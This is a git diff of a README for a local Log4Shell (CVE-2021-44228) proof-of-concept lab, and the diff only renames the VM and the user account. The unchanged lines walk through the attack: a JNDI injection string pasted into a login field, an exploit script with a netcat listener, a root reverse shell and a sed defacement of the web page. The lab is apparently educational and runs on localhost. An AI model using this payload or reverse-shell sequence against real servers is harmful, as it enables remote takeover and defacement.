@@ -28,15 +28,15 @@ rm_poc_log4shell
 
 5. Check status: `vagrant status`
 
-6. Create VM + provision: `vagrant up kalilab`
+6. Create VM + provision: `vagrant up deblab`
 
-    **Note**: In case of errors correct them and try provisioning again with: `vagrant provision kalilab`
+    **Note**: In case of errors correct them and try provisioning again with: `vagrant provision deblab`
 
-7. Connect with ssh: `vagrant ssh kalilab`
+7. Connect with ssh: `vagrant ssh deblab`
 
 ## Lab environment
 
-Open the kalilab GUI and login with kauser.
+Open the deblab GUI and login with debuser.
 We will need 3 terminals for this setup to manage a log4shell hack.
 We open the browser on the localhost:8080 and past the given request: `${jndi:ldap://localhost:1389/a}`
 
@@ -64,7 +64,7 @@ http://localhost:8080/
 #### Terminal 1: netcat listener
 
 ```bash
-┌──(kauser㉿kalilab)-[~]
+┌──(debuser㉿deblab)-[~]
 └─$ nc -lvnp 9001
 listening on [any] 9001 ...
 ```
@@ -72,14 +72,14 @@ listening on [any] 9001 ...
 #### Terminal 2: Launch exploit
 
 ```bash
-┌──(kauser㉿kalilab)-[/log4jlab]
+┌──(debuser㉿deblab)-[/log4jlab]
 └─$ cd /log4jlab/; ls
 Dockerfile     jdk-8u20-linux-x64.tar.gz  requirements.txt
 Exploit.class  LICENSE                    target
 Exploit.java   poc.py                     vulnerable-application
 jdk1.8.0_20    README.md
 
-┌──(kauser㉿kalilab)-[/log4jlab]
+┌──(debuser㉿deblab)-[/log4jlab]
 └─$ sudo python3 poc.py --userip localhost --webport 8000 --lport 9001       
 
 [!] CVE: CVE-2021-44228                                                      
@@ -97,10 +97,10 @@ Listening on 0.0.0.0:1389
 #### Terminal 3: create vulnerable application
 
 ```bash
-┌──(kauser㉿kalilab)-[/log4jlab]
+┌──(debuser㉿deblab)-[/log4jlab]
 └─$ cd /log4jlab/
 
-┌──(kauser㉿kalilab)-[/log4jlab]
+┌──(debuser㉿deblab)-[/log4jlab]
 └─$ docker build -t log4j-shell-poc .
 Sending build context to Docker daemon  574.8MB
 Step 1/5 : FROM tomcat:8.0.36-jre8
@@ -138,7 +138,7 @@ Removing intermediate container d10ead2ef23b
 Successfully built 989227232ea8
 Successfully tagged log4j-shell-poc:latest
 
-┌──(kauser㉿kalilab)-[/log4jlab]
+┌──(debuser㉿deblab)-[/log4jlab]
 └─$ docker run --network host log4j-shell-poc                                
 25-Apr-2022 00:10:33.847 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Server version:        Apache Tomcat/8.0.36
 25-Apr-2022 00:10:33.848 INFO [main] org.apache.catalina.startup.VersionLoggerListener.log Server built:          Jun 9 2016 13:55:50 UTC
@@ -181,12 +181,12 @@ Successfully tagged log4j-shell-poc:latest
 - paste `${jndi:ldap://localhost:1389/a}` in the `username` section
 - press `login`
 
-![poc log4shell](img/kalilabimg/1.poc-log4shell.png)
+![poc log4shell](img/deblabimg/1.poc-log4shell.png)
 
 The hack succeeded when the netcat listener gives:
 
 ```bash
-┌──(kauser㉿kalilab)-[~]
+┌──(debuser㉿deblab)-[~]
 └─$ nc -lvnp 9001
 listening on [any] 9001 ...
 connect to [127.0.0.1] from (UNKNOWN) [127.0.0.1] 48496
@@ -197,22 +197,22 @@ connect to [127.0.0.1] from (UNKNOWN) [127.0.0.1] 48496
 You can check your access and log4shell
 
 ```bash
-┌──(kauser㉿kalilab)-[~]
+┌──(debuser㉿deblab)-[~]
 └─$ nc -lvnp 9001
 listening on [any] 9001 ...
 connect to [127.0.0.1] from (UNKNOWN) [127.0.0.1] 48496
 whoami
 root
 /usr/bin/script -qc /bin/bash /dev/null
-root@kalilab:/usr/local/tomcat# ^Z
+root@deblab:/usr/local/tomcat# ^Z
 [1]+  Stopped                 nc -lvnp 9001
-┌──(kauser㉿kalilab)-[~]
+┌──(debuser㉿deblab)-[~]
 └─$ stty raw -echo; fg; reset
 nc -lvnp 9001
 
-root@kalilab:/usr/local/tomcat# sed -i 's/Hello Again!/<<< LOG4SHELL PoC >>>/g' webapps/ROOT/index.jsp
+root@deblab:/usr/local/tomcat# sed -i 's/Hello Again!/<<< LOG4SHELL PoC >>>/g' webapps/ROOT/index.jsp
 
-root@kalilab:/usr/local/tomcat# sed -i 's/Login/HACKED/g' webapps/ROOT/index.jsp
+root@deblab:/usr/local/tomcat# sed -i 's/Login/HACKED/g' webapps/ROOT/index.jsp
 
 # Refresh browser ;-)
 ```
